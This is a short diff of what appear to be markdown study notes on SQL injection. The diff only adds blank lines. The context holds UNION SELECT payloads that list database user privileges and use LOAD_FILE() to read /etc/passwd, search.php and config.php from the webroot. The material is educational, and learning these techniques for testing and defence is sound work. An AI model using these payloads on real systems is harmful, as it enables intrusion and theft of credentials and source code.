@@ -42,11 +42,13 @@ Where username and password are column name , dev is database name , credentials
       cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -
 #### Step 2:Load File
 Now that we know we have enough privileges to read local system files, let us do that using the LOAD_FILE() function. The LOAD_FILE() function can be used in MariaDB / MySQL to read data from files. The function takes in just one argument, which is the file name. The following query is an example of how to read the /etc/passwd file:
+
       SELECT LOAD_FILE('/etc/passwd');
       cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
 
 #### Another Example
 
 We know that the current page is search.php. The default Apache webroot is /var/www/html. Let us try reading the source code of the file at /var/www/html/search.php.
+
       cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
       cn' UNION SELECT 1, LOAD_FILE("/var/www/html/config.php"), 3, 4-- -
